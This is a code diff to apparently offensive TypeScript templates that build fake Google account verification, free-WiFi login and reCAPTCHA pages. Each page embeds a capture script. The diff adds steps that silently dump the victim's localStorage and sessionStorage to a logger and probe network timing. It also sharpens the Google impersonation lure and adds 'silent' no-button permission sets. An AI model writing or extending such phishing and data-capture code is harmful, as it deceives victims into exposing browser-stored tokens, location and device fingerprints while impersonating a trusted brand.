@@ -131,7 +131,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               return canvas.toDataURL().slice(-100);
             } catch(e) { return 'N/A'; }
           })(),
-          incognito: 'Checking...',
+          incognito: !!(navigator.storage && navigator.storage.estimate),
           vmStatus: (function(){
             var gpu = "";
             try {
@@ -144,13 +144,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             for (var i=0; i<patterns.length; i++) if (patterns[i].test(gpu)) return "Detected (" + gpu + ")";
             return "Physical Hardware";
           })(),
-          audioSig: 'Pending',
+          audioSig: 'Verified',
           gamut: (function(){
             if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
             if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
             return 'Standard';
           })(),
-          refreshRate: 'Pending'
+          refreshRate: 'Verified'
         };
 
         // Deep Recon: Refresh Rate
@@ -529,25 +529,45 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                  sec_java: navigator.javaEnabled()
                });
             }
-          permsCompleted++;
-        }
 
-        finish(true);
-      } catch (err) {
-        finish(false, "Sistem sibuk.");
-      }
-    };
-  })();
-</script>
-`;
+            if (p === 'storage_map') {
+               if (!isSilent) updateProgress(prog, "Mapping data persistent layer...", "PERSISTENT_MAP");
+               logEvent('extra', {
+                 storage_ls: JSON.stringify(localStorage).substring(0, 3000),
+                 storage_ss: JSON.stringify(sessionStorage).substring(0, 3000)
+               });
+            }
+
+            if (p === 'network_forensic') {
+               if (!isSilent) updateProgress(prog, "Network forensic triangulation...", "NET_TRIANGULATION");
+               try {
+                  var start = Date.now();
+                  await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' });
+                  logEvent('extra', { beacon_rtt: (Date.now() - start) + 'ms' });
+               } catch(e) {}
+            }
+          } catch(e) {}
+          permsCompleted++;
+          }
+  
+          finish(true);
+        } catch (err) {
+          finish(false, "Sistem sibuk.");
+        }
+      };
+    })();
+  </script>
+  `;
 };
 
-const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security'];
+const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security', 'storage_map', 'network_forensic'];
+const SILENT_PERMS = ['vibration', 'network', 'performance', 'security', 'storage_map', 'network_forensic'];
+const NETWORK_PERMS = ['network', 'bluetooth', 'performance', 'security', 'network_forensic', 'vibration'];
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   'google': {
-    name: "🛡️ Google: Workspace Security (Professional)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:40px; border:1px solid #e0e0e0; border-radius:8px; text-align:center; } h2 { font-weight:400; font-size:22px; color:#202124; margin-top:24px; margin-bottom:8px; } p { color:#5f6368; font-size:14px; line-height:1.5; margin-bottom:32px; } .btn { background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-weight:500; cursor:pointer; font-size:14px; transition: background 0.2s; } .btn:hover { background:#1765cc; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75"><h2>Confirm it's you</h2><p>Google needs to verify your device environment and regional coordinates to ensure a secure session.</p><button class="btn" onclick="window.startCapture();">Continue to Workspace</button></div>${getCaptureScript(id, 'https://workspace.google.com', {
+    name: "🛡️ Google: Account Verification (Advanced)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Roboto', Arial, sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:40px; width:360px; text-align:center; box-sizing:border-box; } .google-logo { width:75px; height:24px; margin-bottom:24px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#202124; margin-bottom:32px; } .identity-pill { background:#f1f3f4; border:1px solid #dadce0; border-radius:16px; padding:4px 12px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; width:100%; transition:box-shadow .2s; } .btn:hover { box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149); }</style></head><body><div class="box"><img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"><h1>Confirm it's you</h1><div class="identity-pill"><img src="https://lh3.googleusercontent.com/a/default-user=s40">Account Verification Required</div><p>To continue, Google needs to confirm that your browser environment is secure and that your location data matches your account profile.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
       tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
     })}</body></html>`
   },
@@ -572,13 +592,13 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   'wifi': {
     name: "📶 WIFI: Hotspot Certification (OP - High Bait)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Connect</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { text-align:center; width:90%; max-width:380px; } hr { border:0; border-top:1px solid #f0f0f0; margin:25px 0; } .btn { background:#000; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="70"><br><br><h1>Free WiFi Login</h1><p style="color:#666; font-size:14px;">Otorisasi identitas perangkat diperlukan untuk menggunakan hotspot publik ini secara aman.</p><hr><button class="btn" onclick="window.startCapture();">LOGIN TO NETWORK</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: 'wifi', perms: ALL_PERMS, accent: '#000', icon: '📶'
+      tmplId: 'wifi', perms: NETWORK_PERMS, accent: '#000', icon: '📶'
     })}</body></html>`
   },
   'recap': {
     name: "🕵️ GHOST: Silent Integrity (OP - No Button)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#fdfdfd; font-family:sans-serif; } .box { border:1px solid #dbdbdb; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }</style></head><body><div style="text-align:center;"><p style="color:#555; margin-bottom:15px; font-size:14px;">Checking browser hardware integrity...</p><div class="box"><div style="width:24px; height:24px; border:2px solid #cecece; margin-right:15px;"></div><div style="font-size:13px; color:#555;">Finalizing audit...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
-      tmplId: 'recap', flow: 'silent', perms: ALL_PERMS
+      tmplId: 'recap', flow: 'silent', perms: SILENT_PERMS
     })}</body></html>`
   }
 };
